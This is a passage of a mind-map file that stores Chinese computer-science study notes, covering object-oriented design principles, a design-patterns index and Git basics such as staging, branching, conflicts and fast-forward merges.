      <tr>
        <td>
          CRP
        </td>
        <td>
          The Composite Reuse Principle
        </td>
        <td>
          合成复用原则
        </td>
      </tr>
      <tr>
        <td>
          CCP
        </td>
        <td>
          The Common Closure Principle
        </td>
        <td>
          共同封闭原则
        </td>
      </tr>
      <tr>
        <td>
          SAP
        </td>
        <td>
          The Stable Abstractions Principle
        </td>
        <td>
          稳定抽象原则
        </td>
      </tr>
      <tr>
        <td>
          SDP
        </td>
        <td>
          The Stable Dependencies Principle
        </td>
        <td>
          稳定依赖原则
        </td>
      </tr>
    </table>
<markdown-accessiblity-table/>  </body>
</html></richcontent>
<node ID="ID_1070670604" CREATED="1754750651181" MODIFIED="1754750651183"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 迪米特法则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 迪米特法则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#1-迪米特法则">
</a>
    <p dir="auto">
      迪米特法则又叫作最少知识原则（Least Knowledge Principle，简写 LKP），就是说一个对象应当对其他对象有尽可能少的了解，不和陌生人说话。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1920857399" CREATED="1754750651183" MODIFIED="1754750651185"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 合成复用原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 合成复用原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#2-合成复用原则">
</a>
    <p dir="auto">
      尽量使用对象组合，而不是通过继承来达到复用的目的。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1215918879" CREATED="1754750651185" MODIFIED="1754750651187"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 共同封闭原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 共同封闭原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#3-共同封闭原则">
</a>
    <p dir="auto">
      一起修改的类，应该组合在一起（同一个包里）。如果必须修改应用程序里的代码，我们希望所有的修改都发生在一个包里（修改关闭），而不是遍布在很多包里。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1547572011" CREATED="1754750651187" MODIFIED="1754750651188"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 稳定抽象原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 稳定抽象原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#4-稳定抽象原则">
</a>
    <p dir="auto">
      最稳定的包应该是最抽象的包，不稳定的包应该是具体的包，即包的抽象程度跟它的稳定性成正比。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_348477145" CREATED="1754750651189" MODIFIED="1754750651190"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      5. 稳定依赖原则
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 5. 稳定依赖原则" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#5-稳定依赖原则">
</a>
    <p dir="auto">
      包之间的依赖关系都应该是稳定方向依赖的，包要依赖的包要比自己更具有稳定性。
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node ID="ID_80242974" CREATED="1754750651190" MODIFIED="1754750651192"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        Java 编程思想
      </li>
      <li>
        敏捷软件开发：原则、模式与实践
      </li>
      <li>
        <a href="http://www.cnblogs.com/shanyou/archive/2009/09/21/1570716.html" rel="nofollow">面向对象设计的 SOLID 原则</a>
      </li>
      <li>
        <a href="http://design-patterns.readthedocs.io/zh_CN/latest/read_uml.html#generalization" rel="nofollow">看懂 UML 类图和时序图</a>
      </li>
      <li>
        <a href="http://www.cnblogs.com/wolf-sun/p/UML-Sequence-diagram.html" rel="nofollow">UML 系列——时序图（顺序图）sequence diagram</a>
      </li>
      <li>
        <a href="http://blog.csdn.net/jianyuerensheng/article/details/51602015" rel="nofollow">面向对象编程三大特性 ------ 封装、继承、多态</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_415677089" CREATED="1754749811335" MODIFIED="1754750651192" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%95.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      设计模式
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1545322616" CREATED="1754750651193" MODIFIED="1754750651194"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      一、前言
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 一、前言" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%95.md#一前言">
</a>
    <p dir="auto">
      设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_626605563" CREATED="1754750651195" MODIFIED="1754750651196"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、创建型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、创建型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%95.md#二创建型">
</a>
    <ul dir="auto">
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20%20-%20%E5%8D%95%E4%BE%8B.md">单例.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82.md">简单工厂.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%B7%A5%E5%8E%82%E6%96%B9%E6%B3%95.md">工厂方法.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E6%8A%BD%E8%B1%A1%E5%B7%A5%E5%8E%82.md">抽象工厂.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%94%9F%E6%88%90%E5%99%A8.md">生成器.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F.md">原型模式.md</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_137751773" CREATED="1754750651197" MODIFIED="1754750651198"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      三、行为型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 三、行为型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%95.md#三行为型">
</a>
    <ul dir="auto">
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%B4%A3%E4%BB%BB%E9%93%BE.md">责任链.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%91%BD%E4%BB%A4.md">命令.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%A7%A3%E9%87%8A%E5%99%A8.md">解释器.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%BF%AD%E4%BB%A3%E5%99%A8.md">迭代器.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E4%B8%AD%E4%BB%8B%E8%80%85.md">中介者.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%A4%87%E5%BF%98%E5%BD%95.md">备忘录.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%A7%82%E5%AF%9F%E8%80%85.md">观察者.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%8A%B6%E6%80%81.md">状态.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%AD%96%E7%95%A5.md">策略.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95.md">模板方法.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%AE%BF%E9%97%AE%E8%80%85.md">访问者.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%A9%BA%E5%AF%B9%E8%B1%A1.md">空对象.md</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_122088416" CREATED="1754750651199" MODIFIED="1754750651201"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      四、结构型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 四、结构型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%95.md#四结构型">
</a>
    <ul dir="auto">
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E9%80%82%E9%85%8D%E5%99%A8.md">适配器.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E6%A1%A5%E6%8E%A5.md">桥接.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%BB%84%E5%90%88.md">组合.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E8%A3%85%E9%A5%B0.md">装饰.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E5%A4%96%E8%A7%82.md">外观.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E4%BA%AB%E5%85%83.md">享元.md</a>
      </li>
      <li>
        <a href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E4%BB%A3%E7%90%86.md">代理.md</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_939578329" CREATED="1754750651201" MODIFIED="1754750651203"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      参考资料
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 参考资料" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%20-%20%E7%9B%AE%E5%BD%95.md#参考资料">
</a>
    <ul dir="auto">
      <li>
        弗里曼. Head First 设计模式 [M]. 中国电力出版社, 2007.
      </li>
      <li>
        Gamma E. 设计模式: 可复用面向对象软件的基础 [M]. 机械工业出版社, 2007.
      </li>
      <li>
        Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.
      </li>
      <li>
        <a href="http://www.oodesign.com/" rel="nofollow">Design Patterns</a>
      </li>
      <li>
        <a href="http://java-design-patterns.com/" rel="nofollow">Design patterns implemented in Java</a>
      </li>
      <li>
        <a href="http://www.programering.com/a/MTNxAzMwATY.html" rel="nofollow">The breakdown of design patterns in JDK</a>
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node FOLDED="true" POSITION="top_or_left" ID="ID_1184116749" CREATED="1754749744692" MODIFIED="1754749813743" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <strong>工具</strong>
    </p>
  </body>
</html>
</richcontent>
<node FOLDED="true" ID="ID_1760776921" CREATED="1754749813729" MODIFIED="1754750711815" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Git
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1535457230" CREATED="1754750651204" MODIFIED="1754750651206"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      集中式与分布式
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 集中式与分布式" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#集中式与分布式">
</a>
    <p dir="auto">
      Git 属于分布式版本控制系统，而 SVN 属于集中式。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/21cee11a2f9dcfd1a68a100261e359593ac8c18b112f86d1d5e948eb126bf6fb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230303635363739342e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/21cee11a2f9dcfd1a68a100261e359593ac8c18b112f86d1d5e948eb126bf6fb/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230303635363739342e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208200656794.png"/>
    </a><br/>
    

    <p dir="auto">
      集中式版本控制只有中心服务器拥有一份代码，而分布式版本控制每个人的电脑上就有一份完整的代码。
    </p>
    <p dir="auto">
      集中式版本控制有安全性问题，当中心服务器挂了所有人都没办法工作了。
    </p>
    <p dir="auto">
      集中式版本控制需要连网才能工作，如果网速过慢，那么提交一个文件会慢的无法让人忍受。而分布式版本控制不需要连网就能工作。
    </p>
    <p dir="auto">
      分布式版本控制新建分支、合并分支操作速度非常快，而集中式版本控制新建一个分支相当于复制一份完整代码。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_425448121" CREATED="1754750651207" MODIFIED="1754750651208"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      中心服务器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 中心服务器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#中心服务器">
</a>
    <p dir="auto">
      中心服务器用来交换每个用户的修改，没有中心服务器也能工作，但是中心服务器能够 24 小时保持开机状态，这样就能更方便的交换修改。
    </p>
    <p dir="auto">
      Github 就是一个中心服务器。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1413460174" CREATED="1754750651209" MODIFIED="1754750651210"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      工作流
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 工作流" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#工作流">
</a>
    <p dir="auto">
      新建一个仓库之后，当前目录就成为了工作区，工作区下有一个隐藏目录 .git，它属于 Git 的版本库。
    </p>
    <p dir="auto">
      Git 的版本库有一个称为 Stage 的暂存区以及最后的 History 版本库，History 存储所有分支信息，使用一个 HEAD 指针指向当前分支。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/266922af19024f36263547b55e452b85619ffd5632ee2ef4c9e9639b09580a63/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383139353934313636312e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/266922af19024f36263547b55e452b85619ffd5632ee2ef4c9e9639b09580a63/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383139353934313636312e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208195941661.png"/>
    </a><br/>
    

    <ul dir="auto">
      <li>
        git add files 把文件的修改添加到暂存区
      </li>
      <li>
        git commit 把暂存区的修改提交到当前分支，提交之后暂存区就被清空了
      </li>
      <li>
        git reset -- files 使用当前分支上的修改覆盖暂存区，用来撤销最后一次 git add files
      </li>
      <li>
        git checkout -- files 使用暂存区的修改覆盖工作目录，用来撤销本地修改
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d1141177d0b8a5ac77ab755e2498aa6e8ad0e4883c237053001b0cf9088a6979/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230303031343339352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/d1141177d0b8a5ac77ab755e2498aa6e8ad0e4883c237053001b0cf9088a6979/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230303031343339352e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208200014395.png"/>
    </a><br/>
    

    <p dir="auto">
      可以跳过暂存区域直接从分支中取出修改，或者直接提交修改到分支中。
    </p>
    <ul dir="auto">
      <li>
        git commit -a 直接把所有文件的修改添加到暂存区然后执行提交
      </li>
      <li>
        git checkout HEAD -- files 取出最后一次修改，可以用来进行回滚操作
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/2828a611dcae91439fc369b5c34820802dbb4f35235f6ac8aae5273237ea4341/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230303534333932332e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/2828a611dcae91439fc369b5c34820802dbb4f35235f6ac8aae5273237ea4341/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230303534333932332e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208200543923.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1630776019" CREATED="1754750651211" MODIFIED="1754750651213"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分支实现
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 分支实现" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#分支实现">
</a>
    <p dir="auto">
      使用指针将每个提交连接成一条时间线，HEAD 指针指向当前分支指针。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/63b7f0b1299473ce3c0d993446362eb8de781d01231c0f8aeb57c6ed819fd5fe/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333231393932372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/63b7f0b1299473ce3c0d993446362eb8de781d01231c0f8aeb57c6ed819fd5fe/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333231393932372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208203219927.png"/>
    </a><br/>
    

    <p dir="auto">
      新建分支是新建一个指针指向时间线的最后一个节点，并让 HEAD 指针指向新分支，表示新分支成为当前分支。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/fc56a64d928164a80b1d9883d7b1e9854f26f578b2b3de6de8b18f85a78107ae/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333134323532372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/fc56a64d928164a80b1d9883d7b1e9854f26f578b2b3de6de8b18f85a78107ae/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333134323532372e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208203142527.png"/>
    </a><br/>
    

    <p dir="auto">
      每次提交只会让当前分支指针向前移动，而其它分支指针不会移动。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/af852f9ee5d1e3a91020741ca0b5988d8f67cfd550bdf9dc4f258184bd36ed68/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333131323430302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/af852f9ee5d1e3a91020741ca0b5988d8f67cfd550bdf9dc4f258184bd36ed68/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333131323430302e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208203112400.png"/>
    </a><br/>
    

    <p dir="auto">
      合并分支也只需要改变指针即可。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/575b39277520296efd6465529b0e2a693bc9368ba033b42e56781d68d54e825f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333031303534302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/575b39277520296efd6465529b0e2a693bc9368ba033b42e56781d68d54e825f/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333031303534302e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208203010540.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_839706093" CREATED="1754750651213" MODIFIED="1754750651215"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      冲突
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 冲突" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#冲突">
</a>
    <p dir="auto">
      当两个分支都对同一个文件的同一行进行了修改，在分支合并时就会产生冲突。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7795428985ab94fcd914982cb6fcb78ef5a0c4c4ec91694689afa3d8994e3991/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333033343730352e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/7795428985ab94fcd914982cb6fcb78ef5a0c4c4ec91694689afa3d8994e3991/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333033343730352e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208203034705.png"/>
    </a><br/>
    

    <p dir="auto">
      Git 会使用 &lt;&lt;&lt;&lt;&lt;&lt;&lt; ，======= ，&gt;&gt;&gt;&gt;&gt;&gt;&gt; 标记出不同分支的内容，只需要把不同分支中冲突部分修改成一样就能解决冲突。
    </p>
    <pre class="notranslate">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD
Creating a new branch is quick &amp; simple.
=======
Creating a new branch is quick AND simple.
&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature1</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1126036792" CREATED="1754750651215" MODIFIED="1754750651217"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Fast forward
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Fast forward" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Git.md#fast-forward">
</a>
    <p dir="auto">
      &quot;快进式合并&quot;（fast-farward merge），会直接将 master 分支指向合并的分支，这种模式下进行分支合并会丢失分支信息，也就不能在分支历史上看出分支信息。
    </p>
    <p dir="auto">
      可以在合并时加上 --no-ff 参数来禁用 Fast forward 模式，并且加上 -m 参数让合并时产生一个新的 commit。
    </p>
    <pre class="notranslate">$ git merge --no-ff -m &quot;merge with no-ff&quot; dev</pre>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/36018d64a8ad9343f1939e381f62a78d3ca6a7ec163e69b3c754db1d461d0f3b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333633393731322e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/36018d64a8ad9343f1939e381f62a78d3ca6a7ec163e69b3c754db1d461d0f3b/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f696d6167652d32303139313230383230333633393731322e706e67" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20191208203639712.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1192596923" CREATED="1754750651219" MODIFIED="1754750651221"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      储藏（Stashing）
    </p>
  </body>
</html>
